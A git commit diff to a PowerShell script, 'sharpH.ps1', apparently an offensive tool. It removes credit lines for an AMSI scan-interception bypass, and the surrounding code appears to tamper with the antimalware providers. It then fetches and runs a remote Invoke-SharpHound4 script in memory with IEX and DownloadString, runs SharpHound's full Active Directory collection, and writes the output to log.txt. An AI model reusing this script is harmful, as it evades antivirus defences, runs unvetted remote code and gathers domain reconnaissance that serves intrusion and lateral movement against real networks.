c3efa95ed40205697695a7873fd25b97681aaeb1
mariffy <111181799+mariffy@users.noreply.github.com>
2023-11-12 03:17:30 +0800

    Update sharpH.ps1

--- sharpH.ps1
+++ sharpH.ps1
@@ -1,7 +1,3 @@
-Write-Host "AMSI providers' scan interception"
-Write-Host "-- Maor Korkos (@maorkor)"
-Write-Host "-- 64bit implemetation"
-
 $Apis = @"
 using System;
 using System.Runtime.InteropServices;
@@ -41,4 +37,5 @@ while ($AntimalwareProvider -ne 0)
 
 $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpHound4.ps1')
-Invoke-Sharphound4 -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
+$sharphoundOutput = Invoke-Sharphound4 -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
+$sharphoundOutput | Out-File -FilePath "log.txt" -Encoding UTF8
